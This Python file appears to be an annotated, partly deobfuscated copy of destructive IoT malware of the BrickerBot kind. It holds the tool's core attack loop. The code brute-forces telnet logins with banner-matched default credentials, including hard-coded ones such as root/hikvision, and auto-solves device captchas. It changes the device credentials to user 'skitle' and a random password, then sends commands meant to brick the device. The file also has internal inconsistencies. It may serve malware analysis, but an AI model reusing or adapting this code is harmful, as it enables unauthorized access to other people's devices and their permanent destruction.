# Dictionary of previous targets. Keys are hash(socket.socket()) of the target,
# values are banner headers retrieved from target.
targeted_banner2 = {}
# What is the difference between these two dicts?

# Dictionary of previous targets. Keys are hash(socket.socket()) of the target,
# values denote target type. Controls flow of attack (connect, send username,
# send password, etc.)
#
# -1: Send /n to get response from target host.
# 0: Default / start of attack (connected but no specifics).
# 1: Host waiting for username.
# 2: Sent username.
# 3: Host waiting for password.
# 4: Sent password.
# 5: Completed log in, at a CLI.
# 6: Sent target host scan commands.
# 7: Sending kill commands.
# 9: Closed connection .
targeted_step = {}

# Dictionary of previous targets. Keys are hash(socket.socket()) of the target,
# values denote commands to brick target.
# Commands are taken from cmd_brick, then variables in the script such as
# %OLDPASS% and %NEWPASS% are replaced in send_cmd_kill().
cmd_kill_send = {}

# Dictionary of next time to attack the target. Keys are
# hash(socket.socket()) of the target, values are time of next attack attempt.
time_nextattack = {}

# Dictionary of previous targets. Keys are hash(socket.socket()) of the target,
# values are last time of scanning target.
targeted_time = {}

# Dictionary of new usernames set on target hosts. Keys are
# hash(socket.socket()) of the target, values are new usernames set on target
# host.
targeted_newuser = {}

# Dictionary of new passwords set on target hosts. Keys are
# hash(socket.socket()) of the target, values are new passwords set on target
# host.
targeted_newpass = {}

# Dictionary denoting whether target captcha was sent (using i1o0o0O00O(). Keys
# are hash(socket.socket()) of the target, values are 1 (successfully executed
# i1o0o0O00O()) or 0 (unsuccessful call to i1o0o0O00O()).
didcaptcha = {}

# Dictionary of target type (for sending \r\n or \n for EOL). Keys are
# hash(socket.socket()) and values are 'R' if targeted_step = 4 and banner
# is unknown.
EOL_targets = {}

# List of hash(targetip, int(targetport)) of previous targets
targeted_hash = []

# Dictionary of previous targets. Keys are hash(socket.socket()) of the target,
# values are (targetip, int(targetport), bannerhint) of the target.
# How is it different from targeted_targets?
targeted_target2 = {}

# Dictionary of next time to connect to the target. Keys are
# hash(socket.socket()) of the target, values are time of next connect attempt.
time_nextconnect = {}

# Dictionary of sockets of previous targets. Keys are hash(socket.socket()) of
# the target, values are the socket object for the connection.
targeted_sock = {}

# Dictionary of OEM names of previous targets. Keys are
# hash(targetip, int(targetport) of the target, values are the OEM names of
# the targets.
targeted_OEM = {}

# Dictionary of credential index to try. Keys are hash(targetip, int(targetport)
# of the target, and values are an index of credential from credentials_attack{}
# being tried.
cred_i = {}

# Dictionary of default credentials. Keys are hash(targetip, int(targetport) of
# targets, and values are list of default credentials separated by forward
# slash (e.g., "admin/admin")
credentials_attack = {}

# Dictionary of number of attempts at attacking a host, as counted by
attempts = {}


cred_attack_master = {}


def captchanum(parsematrix, maxx, maxy):
    """
    This function takes in a captcha matrix then returns the likely
    corresponding numeral. Note that it expects a very ortholinear number.
    Any sort of angling or visual style to the numbers will likely result in
    misidentification.

    Inputs:
        parsematrix: Matrix representation of captcha.
        maxx: Max extent of captcha matrix in x (horizontal) direction.
        maxy: Max extent of captcha matrix in y (vertical) direction.

    Outputs:
        None.

    Returns:
        Best guess numeral of the captcha, or "-" if unknown.
    """
    for idx_y in range(maxy):
        for idx_x in range(maxx):
            if not idx_x in parsematrix[idx_y]:
                parsematrix[idx_y][idx_x] = ' '

    captchalayout = []

    for idx_y in range(maxy):
        position_L = 0
        position_R = 0
        position_M = 0
        for idx_x in range(maxx):
            if (parsematrix[idx_y][idx_x] != ' ' and
                parsematrix[idx_y][idx_x] != '\t'
                ):
                if idx_x == 0:  # If idx_x at left.
                    position_L = 1
                if idx_x == maxx - 1:  # If idx_x at right.
                    position_R = 1
                if idx_x == int((maxx - 1) / 2):  # If idx_x in middle.
                    position_M = 1
                if idx_x == int((maxx - 1) / 2) + 1:  # If idx_x in middle (+1).
                    position_M = 1

        position = ""
        if position_L:
            position += 'L'
        if position_R:
            position += 'R'
        if position_M:
            position += 'M'
        captchalayout.append(position)

    if (captchalayout[0] == 'LRM' and
        captchalayout[maxy - 1] == 'LRM' and
        captchalayout[1] == 'LR' and
        captchalayout[maxy - 2] == 'LR' and
        captchalayout[int((maxy - 1) / 2)] == 'LR' and
        captchalayout[int((maxy - 1) / 2) + 1] == 'LR'
        ):
        return "0"
    ###
    # #

    # #
    # #

    # #
    ###

    if (captchalayout[0] == 'M' and
        captchalayout[maxy - 1] == 'LRM' and
        captchalayout[1] == 'M' and
        captchalayout[maxy - 2] == 'M'
        ):
        return "1"

     #
     #

     #
    ###

    if (captchalayout[0] == 'LRM' and
        captchalayout[maxy - 1] == 'LRM' and
        captchalayout[1] == 'R' and
        captchalayout[maxy - 2] == 'L'
        ):
        return "2"

    ###
      #

    #
    ###

    if (captchalayout[0] == 'LRM' and
        captchalayout[maxy - 1] == 'LRM' and
        captchalayout[1] == 'R' and
        captchalayout[maxy - 2] == 'R'
        ):
        return "3"

    ###
      #

      #
    ###

    if (captchalayout[0] == 'LR' and
        captchalayout[maxy - 1] == 'R' and
        captchalayout[1] == 'LR' and
        captchalayout[maxy - 2] == 'R'
        ):
        return "4"

    # #
    # #

      #
      #

    if (captchalayout[0] == 'LRM' and
        captchalayout[maxy - 1] == 'LRM' and
        captchalayout[1] == 'L' and
        captchalayout[maxy - 2] == 'R'
        ):
        return "5"

    ###
    #

      #
    ###

    if (captchalayout[0] == 'LRM' and
        captchalayout[maxy - 1] == 'LRM' and
        captchalayout[1] == 'L' and
        captchalayout[maxy - 2] == 'LR'
        ):
        return "6"

    ###
    #

    # #
    ###

    if (captchalayout[0] == 'LRM' and
        captchalayout[maxy - 1] == 'R' and
        captchalayout[1] == 'R' and
        captchalayout[maxy - 2] == 'R'
        ):
        return "7"

    ###
      #

      #
      #

    if (captchalayout[0] == 'LRM' and
        captchalayout[maxy - 1] == 'LRM' and
        captchalayout[1] == 'LR' and
        captchalayout[maxy - 2] == 'LR' and
        (captchalayout[int((maxy - 1) / 2)] == 'LRM' or
         captchalayout[int((maxy - 1) / 2) + 1] == 'LRM')
        ):
        return "8"

    ###
    # #

    ###
    ###

    # #
    ###

    if (captchalayout[0] == 'LRM' and
        captchalayout[maxy - 1] == 'LRM' and
        captchalayout[1] == 'LR' and
        captchalayout[maxy - 2] == 'R'
        ):
        return "9"

    ###
    # #

      #
    ###

    return "-"


time.sleep(3)


def solvecaptcha(captcha):
    """
    This functions a captcha comprised of images of numbers received from a
    target host, indicated by a "Please input the verification code:" in a
    response.
    A solid pixel is anything that is not a space or a tab.
    Note that in order to identify individual numbers, it expects one leading
    empty column, and at least two empty columns to denote the space between
    numbers.

    Inputs:
        captcha: Captcha image from target host.

    Outputs:
        None.

    Returns:
        Calculated catpcha numerical response. If a number is unidentified, it
        may contain hyphen in its place.
    """

    captcha_response = ""
    captchalines = []

    for line in captcha.split('\n'):
        line = line.split('\r')[0]
        if '===========' in line:
            continue
        if re.search('[A-Za-z]', line):
            continue
        if not re.search('\s.*\s.*\s.*\s.*\s.*\s.*\s.*\s.*\s.*\s', line):
            continue
        captchalines.append(line)

    captchalines_N = len(captchalines)
    if captchalines_N < 5:
        return -1

    maxx = 0
    captcha_pos = {}
    idx_y = 0

    for line in captchalines:
        captcha_pos[idx_y] = {}
        idx_x = 0

        for character in line:
            captcha_pos[idx_y][idx_x] = character
            idx_x += 1
        if idx_x > maxx:
            maxx = idx_x

        idx_y += 1

    # If some rows had more or less pixels, back fill with spaces so that
    # captcha_pos[][] is rectangular.
    for idx_y in range(captchalines_N):
        for idx_x in range(maxx):
            if not idx_x in captcha_pos[idx_y]:
                captcha_pos[idx_y][idx_x] = ' '

    # Determines if each column in captcha image has any solid pixels.
    col_is_blank = {}
    for idx_x in range(maxx):
        col_blank = 1
        for idx_y in range(captchalines_N):
            if (captcha_pos[idx_y][idx_x] != ' ' and
                captcha_pos[idx_y][idx_x] != '\t'
                ):
                col_blank = 0
                break
            elif(captcha_pos[idx_y][idx_x] == ' ' or
                 captcha_pos[idx_y][idx_x] == '\t'
                 ):
                pass

        col_is_blank[idx_x] = col_blank

    idx_x0 = - 1
    OoIi = - 1
    idx_x = 0

    # This parses the captcha between the first empty column and the first set
    # of two, empty columns. These edges presumably correspond to the edges of
    # each number in the captcha.
    while idx_x < maxx:

        # Find first blank column, located at idx_x0.
        if col_is_blank[idx_x] == 0:
            idx_x0 = idx_x
            idx_x += 1

            # Search through remaining columns until idx_x at two empty columns,
            # located at idx_xf.
            while idx_x < maxx - 1:

                # If next two columns are blank, parse and send image to
                # captchanum() to figure out the number value.
                if col_is_blank[idx_x] == 1 and col_is_blank[idx_x + 1] == 1:

                    idx_xf = idx_x
                    captcha_noblanks = {}
                    maxx_noblanks = 0

                    for idx_y in range(captchalines_N):
                        captcha_noblanks[idx_y] = {}
                        idx_xscan_noblanks = 0

                        # Create captcha_noblanks from captcha_pos, where blank
                        # columns are removed.
                        for idx_x_offset in range(idx_xf - idx_x0):
                            if col_is_blank[idx_x_offset + idx_x0] == 1:
                                continue
                            captcha_noblanks[idx_y][idx_xscan_noblanks] = \
                                captcha_pos[idx_y][idx_x_offset + idx_x0]
                            idx_xscan_noblanks += 1

                        if idx_xscan_noblanks > maxx_noblanks:
                            maxx_noblanks = idx_xscan_noblanks

                    captcha_response += captchanum(captcha_noblanks,  # parsematrix
                                                   maxx_noblanks,  # maxx
                                                   captchalines_N)  # maxy
                    idx_x0 = -1
                    idx_xf = - 1
                    break
                idx_x += 1
        idx_x += 1

    return captcha_response


def stage_credentials(targetip, targetport, bannerhint):
    """
    This function checks a banner from a target and stages default credentials,
    if applicable. It will also check a hash of the target to prevent multiple
    attempts on the same target. Note that this function does not actually
    scan the target.
    It saves possible credentials to global variable credentials_attack[].

    Inputs:
        targetip: IP of the target host to scan.
        targetport: Port of the target host to scan.
        bannerhint: The banner response from the host.

    Outputs:
        Saves possible credentials to credentials_attack[].

     Returns: Nothing.
    """

    global cred_N  # Number of credentials to stage.
    global cred_semirand  # One semirandonly generated credential.
    global cred_list1  # List of credentials.
    global cred_list2  # List of credentials.

    if not config_eBR:
        return

    target_ipport = (targetip, int(targetport))
    target_hash = hash(target_ipport)

    # Do not reatttack prior target IP and port.
    if target_hash in targeted_hash:
        return

    cred_i[target_hash] = 0

    # Initialize list of default credentials to try.
    credentials_attack[target_hash] = []

    # If banner response from target matches, add credentials to attack.
    for credential in cred_list1:
        if re.search(credential[0], bannerhint):
            credentials_attack[target_hash] += credential[1:]

    # Add one semirandomly generated root/password to attack credentials list.
    if targetport != 4719:
        credentials_attack[target_hash].append(cred_semirand)

    # If banner response from target matches, add credentials to attack.
    for credential in cred_list2:
        if re.search(credential[0], bannerhint):
            credentials_attack[target_hash] += credential[1:]

    # If more than 7 credentials were staged for attack, stage more credentials
    # from cred_list3. Otherwise, add cred_list4 (which has 84 credentials)
    # then add from cred_list3 until cred_N credentials are staged.
    if len(credentials_attack[target_hash]) > 7:
        while len(credentials_attack[target_hash]) < cred_N:
            credentials_attack[target_hash].append(random.choice(cred_list3))
    else:
        credentials_attack[target_hash] += cred_list4
        while len(credentials_attack[target_hash]) < cred_N:
            credentials_attack[target_hash].append(random.choice(cred_list3))

    targeted_target2[target_hash] = (targetip, int(targetport), bannerhint)
    time_nextconnect[target_hash] = 0
    targeted_sock[target_hash] = None
    targeted_OEM[target_hash] = ""
    attempts[target_hash] = 0
    cred_attack_master[target_hash] = ""
    targeted_hash.append(target_hash)


def getsocket(targetip, targetport, bannerhint, masterhash):
    """
    This function connects to a target, saves some target information, and
    returns the socket object. Note that it does not check for a successful
    connection, whether the banner is found, etc.

    Inputs:
        targetip: IP of target host to attack.
        targetport: Port of target host to attack.
        bannerhint: Banner to be searched.

    Outputs:
        Target information keyed by its hash, saved across many variables.

    Returns:
        Socket connection object to the target.
    """

    s_target = (targetip, int(targetport))

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setblocking(0)

    try:
        s.connect(s_target)
    except:
        pass

    # Hash of the target socket object.
    target_sockhash = hash(s)
    # Add to list of hash(sock.sock) of previous targets.
    targeted_sock.append(s)
    # Add to dictionary of previous targets.
    targeted_targets[target_sockhash] = (targetip, int(targetport), bannerhint)
    targeted_step[target_sockhash] = 0

    if targetport == 9527:
        targeted_step[target_sockhash] = -1

    cmd_kill_send[target_sockhash] = []
    time_nextattack[target_sockhash] = 0
    targeted_banner1[target_sockhash] = ''
    targeted_banner2[target_sockhash] = ''
    targeted_time[target_sockhash] = time.time()
    targeted_newuser[target_sockhash] = ''
    targeted_newpass[target_sockhash] = ''
    didcaptcha[target_sockhash] = 0
    EOL_targets[target_sockhash] = ''
    targeted_masterhash[target_sockhash] = masterhash
    targeted_sock[masterhash] = s

    return s


def resetcounters(brutehash):
    """
    This function resets the credential attacks after cred_N have been
    attempted.

    Inputs:
        brutehash: Hash(hash(socket.socket()) of target host.

    Outputs:
        Various lists and dictionaries such as cred_i, trageted_sock, etc.
        are reset.

    Returns:
        None.
    """

    cred_i[brutehash] = None
    credentials_attack[brutehash] = None
    targeted_target2[brutehash] = None
    time_nextconnect[brutehash] = None
    targeted_sock[brutehash] = None
    targeted_OEM[brutehash] = None
    attempts[brutehash] = None
    cred_attack_master[brutehash] = None
    targeted_hash.remove(brutehash)


def close_sock(sock):
    """
    This function closes a socket connection and either removes or resets
    related counters.

    Inputs:
        sock: Socket.socket() object being closed.

    Outputs:
        Various lists and dictionaries such as targeted_sock and
        targeted_time are updated or reset.

    Returns:
        None.
    """


    global cred_N
    global time_wait_conn
    global config_sBR
    global config_sBL

    target_sockhash = hash(sock)
    try:
        sock.close()
    except:
        pass

    masterhash = targeted_masterhash[target_sockhash]

    if targeted_step[target_sockhash] >= 5 and (config_sBR or config_sBL):
        cmd_OEM = targeted_OEM[masterhash]

        if cmd_OEM == 'honeypot' or cmd_OEM == 'mtguest':
            attempts[masterhash] = 9999
        if cmd_OEM == '':
            cmd_OEM = 'unknown'

        userpass = ''
        # Add username
        if targeted_newuser[target_sockhash]:
            userpass = targeted_newuser[target_sockhash] + '/'
        elif targeted_newpass[target_sockhash]:
            userpass = cred_attack_master[masterhash].split('/')[0] + '/'
        # Add password
        if targeted_newpass[target_sockhash]:
            userpass += targeted_newpass[target_sockhash]

        # Modify banner: Concatonate target banner with ; instead of newlines,
        # and remove some special chars (quotes, hats, underlines, etc.)
        banner_sanit = re.sub('\r?\n', ';', targeted_banner1[target_sockhash])
        banner_sanit = re.sub('[^A-Za-z0-9 \.,:;<>\(\)\[\]\-+%!@/#$=]',
                              '',
                              banner_sanit)

        if not config_sBL or cmd_OEM == 'unknown' or cmd_OEM == 'telnet':
            printstatus("%s:%d BR:%s:%s:%s:%s" % (targeted_target2[masterhash][0],  # IP
                                                  targeted_target2[masterhash][1],  # port
                                                  cmd_OEM,
                                                  cred_attack_master[masterhash],
                                                  userpass,
                                                  banner_sanit[:8192]
                                                  )
                        )
        else:
            printstatus("%s:%d BR:%s:%s:%s:%s" % (targeted_target2[masterhash][0],  # IP
                                                  targeted_target2[masterhash][1],  # port
                                                  cmd_OEM, cred_attack_master[masterhash],
                                                  userpass,
                                                  banner_sanit[:32]
                                                  )
                        )

    timenow = time.time()
    if time_nextconnect[masterhash] <= timenow:
        time_nextconnect[masterhash] = time.time() + time_wait_conn
    targeted_sock[masterhash] = None
    attempts[masterhash] += 1

    if attempts[masterhash] >= cred_N:
        resetcounters(masterhash)

    targeted_sock.remove(sock)
    targeted_targets[target_sockhash] = None
    targeted_step[target_sockhash] = None
    cmd_kill_send[target_sockhash] = None
    time_nextattack[target_sockhash] = None
    targeted_banner1[target_sockhash] = None
    targeted_banner2[target_sockhash] = None
    targeted_time[target_sockhash] = None
    targeted_newuser[target_sockhash] = None
    targeted_newpass[target_sockhash] = None
    didcaptcha[target_sockhash] = None
    targeted_masterhash[target_sockhash] = None
    EOL_targets[target_sockhash] = None


def resettime_nextconnect():
    """
    This function goes through targets listed in targeted_hash then, if
    if the target is not listed in targeted_sock and the wait-to-reconnect
    to the target has passed, adds the target to target_sock and updates the
    delay time.

    Inputs:
        None.

    Outputs:
        Add target hash to targeted_sock if not listed and wait time to
        reconnect has passed.

    Returns:
        None.
    """
    timenow = time.time()
    for targethash in targeted_hash:  # targethash = hash(ip, port)
        masterhash = hash(targethash)
        if targeted_sock[masterhash] == None:
           if timenow >= time_nextconnect[masterhash]:
                targetsock = getsocket(targeted_target2[masterhash][0],  # IP.
                                       targeted_target2[masterhash][1],  # Port.
                                       targeted_target2[masterhash][2],  # Banner hint.
                                       masterhash)
                targeted_sock[masterhash] = targetsock
                time_nextconnect[masterhash] = 0


def send_cmd_kill(sock, brutehash, masterhash):
    """
    This function will send kill commands to target host. It will first replace
    any variables in the commands (such as %OLDPASS%, %NEWPASS%). Note that
    in commands where it replaces the password, the replacement user/pass are:
    user: skitle
    pass: 8 random of lower and upper case letters, and numbers, where each
            number is 3x more likely than a letter.

    Inputs:
        sock: Socket object of target host.
        brutehash: Hash for kill commands.
        masterhash: Hash for credentials.
    
    Outputs:
        Updates some lists or dictionaries such as time_nextattack[] and
        targeted_banner2.

    Returns: 
        0 if sending kill command fails.
        1 if sending kill command succeeds.
    """

    global time_wait

    if('cabhCdpServerRouter: 127.0.0.1' in targeted_banner1[brutehash] and
       len(cmd_kill_send[brutehash]) > 2
       ):
        cmd_kill_send[brutehash] = cmd_kill_send[brutehash][2:]
        targeted_banner1[brutehash] = re.sub("cabhCdpServerRouter: 127.0.0.1",
                                             '(already set)',
                                             targeted_banner1[brutehash]
                                             )

    if len(cmd_kill_send[brutehash]) <= 1:
        time_nextattack[brutehash] = time.time() + 10
        targeted_step[brutehash] = 9
        try:
            sock.shutdown()
        except:
            pass
        cmd_kill_send[brutehash] = ''
        return 0

    loop = True  # oOo0

    while cmd_kill_send[brutehash][1] == '' or loop:
        if '%' in cmd_kill_send[brutehash][0]:
            if '%OLDUSER%' in cmd_kill_send[brutehash][0]:
                cmd_kill_send[brutehash][0] = re.sub('%OLDUSER%',
                                             cred_attack_master[masterhash].split('/')[0],
                                             cmd_kill_send[brutehash][0]
                                             )
            if '%OLDPASS%' in cmd_kill_send[brutehash][0]:
                cmd_kill_send[brutehash][0] = re.sub('%OLDPASS%',
                                             cred_attack_master[masterhash].split('/')[1],
                                             cmd_kill_send[brutehash][0]
                                             )
            if '%NEWUSER%' in cmd_kill_send[brutehash][0]:
                targeted_newuser[brutehash] = 'skitle'
                cmd_kill_send[brutehash][0] = re.sub('%NEWUSER%',
                                              'skitle',
                                              cmd_kill_send[brutehash][0]
                                              )
            if '%NEWPASS%' in cmd_kill_send[brutehash][0]:
                if targeted_newpass[brutehash] == '':
                    targeted_newpass[brutehash] = ''.join(
                        random.choice(
                            'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                            'abcdefghijklmnopqrstuvwxyz'
                            '012345678901234567890123456789'
                        ) for i in range(8))
                cmd_kill_send[brutehash][0] = re.sub('%NEWPASS%',
                                             targeted_newpass[brutehash],
                                             cmd_kill_send[brutehash][0]
                                             )
            if '%TARGETIP%' in cmd_kill_send[brutehash][0]:
                cmd_kill_send[brutehash][0] = re.sub('%TARGETIP%',
                                             targeted_target2[masterhash][0],
                                             cmd_kill_send[brutehash][0]
                                             )
            if '%TARGETPORT%' in cmd_kill_send[brutehash][0]:
                cmd_kill_send[brutehash][0] = re.sub('%TARGETPORT%',
                                             '%d' %
                                             (targeted_target2[masterhash][1]),
                                             cmd_kill_send[brutehash][0]
                                             )
            if '%RELAUNCH%' in cmd_kill_send[brutehash][0]:
                credentials_attack[masterhash] = ['root/20080826',
                                                  'root/20080826',
                                                  'root/20080826'
                                                  ]
                cred_i[masterhash] = 0
                close_sock(sock)
                return 0

            if '%RELAUNCH2%' in cmd_kill_send[brutehash][0]:
                credentials_attack[masterhash] = ['root/hikvision',
                                                  'root/hikvision',
                                                  cred_attack_master[masterhash],
                                                  cred_attack_master[masterhash]
                                                  ]
                cred_i[masterhash] = 0
                close_sock(sock)
                return 0

        EOL = '\n'
        if EOL_targets[brutehash] == 'R':
            EOL = '\r\n'

        try:
            sock.send(cmd_kill_send[brutehash][0] + EOL)
        except:
            pass

        if cmd_kill_send[brutehash][1] == '':
            if len(cmd_kill_send[brutehash]) <= 2:
                time_nextattack[brutehash] = time.time() + 10
                targeted_step[brutehash] = 9
                try:
                    sock.shutdown()
                except:
                    pass
                cmd_kill_send[brutehash] = ''
                return 0
            else:
                cmd_kill_send[brutehash] = cmd_kill_send[brutehash][2:]
        else:
            loop = False

    # No more commands to send.
    if len(cmd_kill_send[brutehash]) <= 0:
        return 0

    time_nextattack[brutehash] = time.time() + time_wait
    targeted_banner2[brutehash] = ''
    return 1

# Dictionary indicating whether target host is unknown based on banner 
# information. Keys are hash of target IP. Values are 1 if unknown.
targeted_unk = {}

def killtargets():
    """
    This function attempts to log in, then kill or brick the target hosts. It
    parses responses / banners from the target hosts then chooses its commands
    from cmd_kill appropriately, then sends it. Then it closes the socket. It
    attacks all sockets from targeted_sock[].

    Inputs:
        None.

    Outputs:
        None.

    Returns:
        None.

    """
    global waitafterlogin
    global waitafterlogin
    global cmd_scantarget
    global time_wait
    global targeted_unk

    timenow = time.time()

    timeout = 0.01  # O00Oo
    # Wrapper to Unix select(), returns subset of socks that are ready for
    # read (sockreadyr) and write (sockreadyw).
    sockreadyr, sockreadyw, noneready = select.select(targeted_sock,
                                                      targeted_sock,
                                                      [],
                                                      timeout
                                                      )

    for s in targeted_sock:
        target_sockhash = hash(s)
        try:
            s_opt = s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
        except:
            s_opt = - 1

        if s_opt != 0:
            close_sock(s)
            continue

        if s in sockreadyr:
            banner = ''
            try:
                banner = s.recv(2048)
            except:
                pass

            # Respond to IAC DO cmd with IAC WONT cmd, and respond to IAC WILL
            # cmd with IAC DONT cmd (e.g. SO #29509437).
            try:
                for banner_charrep in re.findall('\xff\xfd.', banner):
                    s.send('\xff\xfc' + banner_charrep[2])
                for banner_objrep in re.findall('\xff\xfb.', banner):
                    s.send('\xff\xfe' + banner_objrep[2])
            except:
                pass

            if banner:
                targeted_banner1[target_sockhash] += banner
                targeted_banner2[target_sockhash] += banner

                if targeted_step[target_sockhash] == 0:

                    if ((
                         'BusyBox v' in targeted_banner1[target_sockhash] and
                         ('# ' in targeted_banner1[target_sockhash] or
                          '$ ' in targeted_banner1[target_sockhash])
                         ) or
                        ('Linux ' in targeted_banner1[target_sockhash] and
                         ('# ' in targeted_banner1[target_sockhash][-2:] or
                          '$ ' in targeted_banner1[target_sockhash][-2:]) and
                          not '##' in targeted_banner1[target_sockhash] and
                          not '$$' in targeted_banner1[target_sockhash])
                        ):

                        masterhash = targeted_masterhash[target_sockhash]
                        targeted_step[target_sockhash] = 5

                        cred_attack_master[masterhash] = 'root/BUSYBOXBLANK'
                        continue

                    if (didcaptcha[target_sockhash] == 0 and
                        'Please input the verification code:' in
                            targeted_banner1[target_sockhash]
                        ):
                        response = ''
                        try:
                            response = solvecaptcha(targeted_banner1[target_sockhash])
                        except:
                            printstatus("ERR: BCS crashed")
                            pass

                        # Send captcha response.
                        try:
                            s.send(response + '\n')
                        except:
                            pass

                        didcaptcha[target_sockhash] = 1

                    if ('to set your login password' in targeted_banner1[target_sockhash] and
                        'passwd' in targeted_banner1[target_sockhash]and
                        'root@' in targeted_banner1[target_sockhash]
                         ):
                        masterhash = targeted_masterhash[target_sockhash]
                        targeted_step[target_sockhash] = 5
                        cred_attack_master[masterhash] = 'root/OPENWRTBLANK'
                        continue

                    if ('APPCOM:' in targeted_banner1[target_sockhash] or
                        'DEBUG avc:' in targeted_banner1[target_sockhash] or
                        'Polycom Command Shell' in targeted_banner1[target_sockhash]
                         ):
                        masterhash = targeted_masterhash[target_sockhash]
                        targeted_step[target_sockhash] = 5
                        cred_attack_master[masterhash] = '<blank>/<blank>'

                        continue

                    if ('REINCARNA' in targeted_banner1[target_sockhash] and
                        'Wifatch' in targeted_banner1[target_sockhash]
                        ):
                        masterhash = targeted_masterhash[target_sockhash]
                        close_sock(s)
                        resetcounters(masterhash)
                        continue
                    if 'Command line is locked now' in targeted_banner1[target_sockhash]:
                        close_sock(s)
                        continue
                    if 'You have to wait' in targeted_banner1[target_sockhash]:
                        reresult = re.search('You have to wait (\d+) min '
                                             '(\d+) sec',
                                             targeted_banner1[target_sockhash]
                                             )
                        if reresult:
                            masterhash = targeted_masterhash[target_sockhash]
                            waitmin = int(reresult.group(1))
                            waitsec = int(reresult.group(2))
                            time_nextconnect[masterhash] = timenow + \
                                                           waitsec + \
                                                           waitmin*60
                        close_sock(s)
                        continue

                    if (':' in targeted_banner1[target_sockhash] and
                        ('Login' in targeted_banner1[target_sockhash] or
                         'login' in targeted_banner1[target_sockhash] or
                         'username' in targeted_banner1[target_sockhash] or
                         'user name' in targeted_banner1[target_sockhash] or
                         'Username' in targeted_banner1[target_sockhash] or
                         'USERNAME' in targeted_banner1[target_sockhash] or
                         'LOGIN' in targeted_banner1[target_sockhash]) or
                         'Account:' in targeted_banner1[target_sockhash]
                        ):
                        targeted_step[target_sockhash] = 1
                    if (':' in targeted_banner1[target_sockhash] and
                        ('assword' in targeted_banner1[target_sockhash] or
                         'pass word' in targeted_banner1[target_sockhash])
                        ):
                        targeted_step[target_sockhash] = 3
                if targeted_step[target_sockhash] == 2:
                    if (':' in targeted_banner1[target_sockhash] and
                        ('assword' in targeted_banner1[target_sockhash] or
                         'pass word' in targeted_banner1[target_sockhash])
                        ):
                        targeted_step[target_sockhash] = 3

                if targeted_step[target_sockhash] == 4:
                    if (not 'Last login:' in targeted_banner2[target_sockhash] and
                        ('incorrect' in targeted_banner2[target_sockhash] or
                         'Incorrect' in targeted_banner2[target_sockhash] or
                         (':' in targeted_banner2[target_sockhash] and
                          ('Login' in targeted_banner2[target_sockhash] or
                           'login' in targeted_banner2[target_sockhash] or
                           'username' in targeted_banner2[target_sockhash] or
                           'user name' in targeted_banner1[target_sockhash] or
                           'Username' in targeted_banner2[target_sockhash] or
                           'USERNAME' in targeted_banner2[target_sockhash] or
                           'LOGIN' in targeted_banner2[target_sockhash])
                         ) or
                         'unrecognized user' in targeted_banner2[target_sockhash] or
                         "Invalid password" in targeted_banner2[target_sockhash]
                         )
                        ):
                        if (not 'RouterOS' in targeted_banner2[target_sockhash] and
                            not 'critical login failure for user' in targeted_banner2[target_sockhash] and
                            not 'Completes the command' in targeted_banner2[target_sockhash] and
                            not '[admin@' in targeted_banner2[target_sockhash]
                            ):
                            masterhash = targeted_masterhash[target_sockhash]
                            cred_i[masterhash] += 1
                            # Reset cred_i if reached end of credentials list.
                            if (cred_i[masterhash] >=
                                    len(credentials_attack[masterhash])
                                ):
                                cred_i[masterhash] = 0
                            close_sock(s)
                            continue
                        else:
                            EOL_targets[target_sockhash] = 'R'

                    masterhash = targeted_masterhash[target_sockhash]
                    if not ('admin/' in credentials_attack[masterhash] and
                            '________admin,' in targeted_banner2[target_sockhash]
                            ):
                        regresult = re.search('__________admin,([^_]*)______',
                                             targeted_banner2[target_sockhash]
                                             )
                        if regresult:
                            credentials_attack[masterhash] = ['admin/' +
                                                              regresult.group(1)]
                            printstatus('NOTC: IP %s:%d -> retry with lc %s'%
                                        (targeted_target2[masterhash][0],  # IP
                                         targeted_target2[masterhash][1],  # port
                                         credentials_attack[masterhash][0])  # username
                                        )
                            cred_i[masterhash] = 0
                            close_sock(s)
                            continue

                    bannerlast40 = targeted_banner2[target_sockhash][-40:]
                    bannerlast80 = targeted_banner2[target_sockhash][-80:]

                    if ((re.search('[$%#>] $', bannerlast40[-2:]) and
                         not 'assword>' in bannerlast40[- 10:]) or
                        'Press enter key' in bannerlast40 or
                        re.search('\[\S+@\S*\] > ', bannerlast40) or
                        'BusyBox v' in targeted_banner2[target_sockhash] or
                        '? for help' in targeted_banner2[target_sockhash] or
                        ': not found' in bannerlast40 or
                        'exit system' in bannerlast40 or
                        ('User Access Verification' in targeted_banner1[target_sockhash] and
                         re.search( '[A-Z0-9a-z\-][#>]$', bannerlast40[-2:])
                         ) or
                        'Password expiration warning' in
                            targeted_banner2[target_sockhash] or
                        'for a list of built-in commands' in bannerlast80 or
                        'step into administration terminal' in bannerlast80 or
                        'Incomplete command found at' in bannerlast80 or
                        'welcome to use cli' in targeted_banner2[target_sockhash] or
                        ('Login authentication' in targeted_banner1[target_sockhash] and
                         re.search('[A-Z0-9a-z]\>$', bannerlast40[- 2:])
                         ) or
                        'Main menu' in targeted_banner2[target_sockhash] or
                        '% Unrecognized command' in bannerlast40 or
                        'ATP>' in bannerlast40 or
                        re.search('HG\d\S+>$', bannerlast40) or
                        'Last login: ' in bannerlast80
                        ):
                        cred_attack_master[masterhash] = \
                            credentials_attack[masterhash][cred_i[masterhash]]
                        credentials_attack[masterhash] = [cred_attack_master[masterhash]]
                        cred_i[masterhash] = 0
                        targeted_step[target_sockhash] = 5

                if targeted_step[target_sockhash] == 6:
                    masterhash = targeted_masterhash[target_sockhash]
                    cmd_OEM = ''
                    cmd_kill = ''
                    if not cmd_OEM:
                        for cmd in cmd_brick:
                            if (re.search(cmd[1],
                                          cred_attack_master[masterhash]) and
                                re.search(cmd[2],
                                          targeted_banner1[target_sockhash])
                                ):
                                if (cmd[0] == 'linux' or
                                    cmd[0] == 'telnet' or
                                    cmd[0] == 'busybox' or
                                    cmd[0] == 'freescale'
                                    ):
                                    if (targeted_banner1[target_sockhash].count('> ') < 6 and
                                        targeted_banner1[target_sockhash].count('# ') < 6 and
                                        targeted_banner1[target_sockhash].count('% ') < 6 and
                                        targeted_banner1[target_sockhash].count('$ ') < 6 and
                                        targeted_banner1[target_sockhash].count('m]#') < 6
                                        ):
                                        continue
                                cmd_OEM = cmd[0]
                                cmd_kill = cmd[3:]
                                break
                    if cmd_OEM:
                        targeted_step[target_sockhash] = 7
                        targeted_OEM[masterhash] = cmd_OEM
